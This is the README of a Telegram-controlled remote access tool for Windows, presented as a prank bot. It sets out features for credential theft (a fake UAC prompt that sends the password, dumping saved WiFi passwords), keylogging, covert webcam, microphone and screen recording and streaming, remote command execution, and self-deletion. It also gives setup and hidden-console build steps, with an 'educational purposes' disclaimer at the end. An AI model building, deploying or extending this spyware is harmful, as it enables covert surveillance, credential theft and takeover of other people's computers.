# RCPepTelegram
Remote Control Bot, inspired to the previous creation named "Peppino", this one offers many features, including some pretty original pranks.
(only tested on Windows10/11)

```/help: 
🏠 Main Menu
mainmenu - Shows main menu.
🛑 System & Shutdown
fakeuac - Fake UAC prompt, sends password.
shutdown - Power off PC.
fakeshutdown - Fake shutdown sequence.
altf4 - Press Alt+F4.
clear - Clean windows, webcam, temp files.
selfdestruction - Remove program permanently.
🌐 Network & Remote Access
wifiinfo - Show saved WiFi passwords.
getip - Get public IP and location.
📸 Camera & Screen
selfie - Take webcam photo.
screenshot - Capture screen.
fullclip - Record screen + webcam.
webcamclip - Record webcam only.
screenclip - Record screen only.
recordjum - Record 20s jumpscare reaction.
waitforface - Send photo when face detected.
displaymode - Change display settings.
webcamstreamstart - Start webcam stream.
screenstreamstart - Start screen stream.
webcamstreamstop - Stop webcam stream.
screenstreamstop - Stop screen stream.
webcamandscreenstreamstart - Both streams.
webcamandscreenstreamstop - Stop both streams.
🔊 Audio & Volume
urltoast - Windows toast with URL.
breath - Play breathing sound.
pss - Play "psst" sound.
fart - Play fart sound.
playrandomnoise - Play static/interference.
knockknock - Play door knocking.
microphone - Record audio from mic.
mutevolume - Mute system.
fullvolume - Max volume.
setvolume - Set volume level.
getvolume - Check current volume.
tralalerotralala - Play Italian brainrot.
mixermenu - Audio controls menu.
playfromurl - Play audio from URL.
😈 Pranks & Visuals
jumpscare - Random jumpscare.
jumpscarenoaudio - Jumpscare without sound.
invertedscreen - Invert screen colors.
distortedscreen - Distort screen image.
messagebox - Custom message box.
messagespam - Spam message boxes.
camerawallpaper - Webcam as wallpaper.
setvideowallpaper - Video as wallpaper.
hdmi_drowning_effect - Noise overlay.
stop_hdmi_drowning_effect - Stop overlay.
disturbed_overlay_and_random_noise - Noise overlay + audio.
💻 System Control
execute - Run system command.
processkiller - Kill process from list.
terminateprocess - Kill process by name.
procmonmenu - Process monitor menu.
procmonadd - Add to process monitor.
procmonrem - Remove from process monitor.
cmdsession - Open CMD session.
🎮 Input / Device Control
randomkeyboard - Randomize keyboard input.
capslock - Toggle Caps Lock.
mousecontroller - Mouse control menu.
mouselock - Lock mouse position.
setMouseJump - Set mouse movement distance.
📋 Messaging
bsend - Send text message.
id - Get chat ID.
deletemessages - Delete last N messages.
deleteallmessages - Delete all messages.
🔒 Can't Open List
cantopenadd - Block process.
cantopenremove - Unblock process.
cantopenmenu - View blocked processes.
🧠 Keylogger
keylogger - Log keystrokes to file.
livekeylogger - Live keystroke updates.
🦑 Misc
plankton - Plankton jumpscare.
planktonnoaudio - Plankton without audio.
johnpork - John Pork jumpscare.
johnporknoaudio - John Pork without audio.
gabinetti - Gabinetti meme.
duckyscript - Run DuckyScript.
duckyhelp - DuckyScript commands.
browser - Open URL.
📎 File Input Commands
*sending a photo* - Displays the photo on the screen as a pop-up.
*sending a photo with "/jumpscare" caption* - Will create a jumpscare with that photo.
*sending a video with /setvideowallpaper as caption will play it as wallpaper(dont use long videos).
*sending an audio/voice* - Will play the audio/voice in the background.
*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)
*sending a file with /save and the path will save that file in that path, no matter the extension. (example *photo* /save C:\Users\YOURUSER\Photo\*
📚 Multi-Command
You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam
```
## Features
- Screen Recording: Record the screen for a specified duration.
- Webcam Recording: Record video from the webcam.
- Keylogging: Log keystrokes and send them to the bot owner.
- Remote Commands: Execute system commands remotely.
- Duckyscript Execution: Execute Duckyscript payloads.
- Audio Recording: Record audio from the microphone.
- Screenshot Capture: Take screenshots of the system.
- Message Boxes: Display custom message boxes on the system.
- System Control: Simulate system shutdowns or other actions.
- Live Webcam and Screen: Use ngrok tunnels to have a live view of the machine.
## Installation
1. Clone the repository

```bash
git clone https://github.com/RiccardoZappitelli/RCPepTelegram

```
2. Install the dependences

```bash
pip install -r requirements.txt

```
## Configuration
Create your own bot with <a href="https://core.telegram.org/bots#botfather">Botfather</a>
Obtain your CHAT ID and BOT TOKEN.
auth.json

```json
{
    "token":"<YOUR TOKEN>",
    "chatid":youchatid,
    "ngrok_token":"<YOUR NGROK TOKEN>"
}

```
## BUILD
Get the latest version of [FakeUAC](https://github.com/RiccardoZappitelli/FakeUAC) and put the executable in assets/executable/fakeuac.exe.
I could not add it because github has a 100MB limit and the executable was 114MB.
```bash
nuitka pep2.py --standalone --windows-console-mode=disable --onefile --follow-imports --msvc=latest --include-data-dir=assets/vfx=assets/vfx --include-data-dir=assets/sfx=assets/sfx --include-data-dir=assets/model=assets/model --include-data-file=auth.json=auth.json --include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe
```
## 🧩 Plugin System
RCPepTelegram supports **class-based plugins** that integrate directly with the bot, UI, and messaging system.
### 📁 Plugin Structure

```
plugins/
├── plugin_base.py
├── system_plugins.py
└── custom_plugins.py
```
### 🧪 Minimal Plugin Example

```python
from .plugin_base import Plugin
import os
class ShutdownTimed(Plugin):
    def __init__(self):
        super().__init__("⏻ Schedule Shutdown", "shutdown_timed")
    def action(self, seconds: int = 60):
        os.system(f"shutdown -s -t {seconds}")
        self.pep2.bsend(f"Shutdown scheduled in {seconds} seconds.")
```
### 🧠 Plugin Rules
- Inherit from `Plugin`
- `__init__(label, command)` sets button name and Telegram command
- `action(...)` is triggered on command/button click
- `self.pep2` is the reference to the running `PeppinoTelegram` instance
### 📌 Plugin Registration

```python
plugins = [
    ShutdownTimed,
    ToggleCapsLock,
    LockWorkstation
]
```
## ⚠️ WARNING: Security and Ethical Risks ⚠️
This code is intended for educational purposes only and should not be used in any malicious, unethical, or unauthorized manner. The script contains functionalities that can potentially compromise the security and privacy of a system, including but not limited to:
- Remote Control: The code allows for remote control of a system, including executing commands, capturing screenshots, recording audio/video, and more.
- Keylogging: The script includes keylogging capabilities, which can record keystrokes and send them to a remote user.
- Webcam Access: The script can access and record from the webcam without the user's explicit consent.
- System Manipulation: The script can simulate system shutdowns, open message boxes, and perform other actions that could disrupt normal system operations.
- Duckyscript Execution: The script can execute Duckyscript payloads, which are often used in penetration testing but can also be used maliciously.
## Ethical Considerations
Unauthorized Access: Using this script to access or control a system without the owner's explicit permission is illegal and unethical.
## Privacy Violation: Capturing audio, video, or screenshots without consent is a serious violation of privacy.
Potential for Abuse: This script can be easily modified for malicious purposes, such as spying, data theft, or system disruption.
## Security Risks
- Exposure of Sensitive Data: If the script is not properly secured, sensitive information such as Telegram API tokens, chat IDs, and recorded data could be exposed.
- Remote Exploitation: If the script is deployed in an insecure environment, it could be exploited by attackers to gain unauthorized access to the system.
## Recommendations
- Use Responsibly: Only use this script in environments where you have explicit permission to do so, such as your own systems or systems you are authorized to test.
- Secure Your Environment: Ensure that any API tokens, chat IDs, or other sensitive information are kept secure and not exposed to unauthorized users.
- Legal Compliance: Be aware of and comply with all applicable laws and regulations regarding system access, privacy, and data protection.
- By using this code, you acknowledge and accept full responsibility for any actions taken with it. The author of this code is not responsible for any misuse, damage, or legal consequences that may arise from its use.